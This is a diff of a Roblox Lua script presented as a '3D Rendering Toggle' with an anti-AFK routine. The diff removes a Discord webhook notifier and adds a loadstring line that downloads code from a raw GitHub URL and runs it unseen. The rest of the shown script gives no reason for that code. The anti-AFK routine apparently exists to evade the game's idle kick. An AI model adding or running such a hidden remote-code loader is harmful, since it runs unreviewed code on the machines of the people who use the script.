@@ -4,9 +4,9 @@ local Window = Library.CreateLib("3D Rendering Toggle", "Serpent")
 -- Anti-AFK Loader
 local vu = game:GetService("VirtualUser")
 game:GetService("Players").LocalPlayer.Idled:connect(function()
-    vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
     wait(1)
-    vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
+    vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
 end)
 
 -- Appearance Tab
@@ -92,28 +92,5 @@ game.Players.LocalPlayer.Idled:connect(function()
     StatusLabel.Text = "Status: Active"
 end)
 
--- Discord Webhook
-local HttpService = game:GetService("HttpService")
-local webhookURL = "YOUR_DISCORD_WEBHOOK_URL" -- Replace with your actual Webhook URL
-
-local function sendToDiscord(playerName, reason)
-    local data = {
-        ["content"] = playerName .. " has " .. reason .. " the game."
-    }
-
-    local jsonData = HttpService:JSONEncode(data)
-
-    -- Make an HTTP POST request
-    HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
-end
-
--- Detect player leaving
-game.Players.PlayerRemoving:Connect(function(player)
-    sendToDiscord(player.Name, "left")
-end)
-
--- Detect server shutdown
-game:BindToClose(function()
-    sendToDiscord("Server", "shut down")
-    print("Server is shutting down, sending notification to Discord.")
-end)
+-- Loadstring Code
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
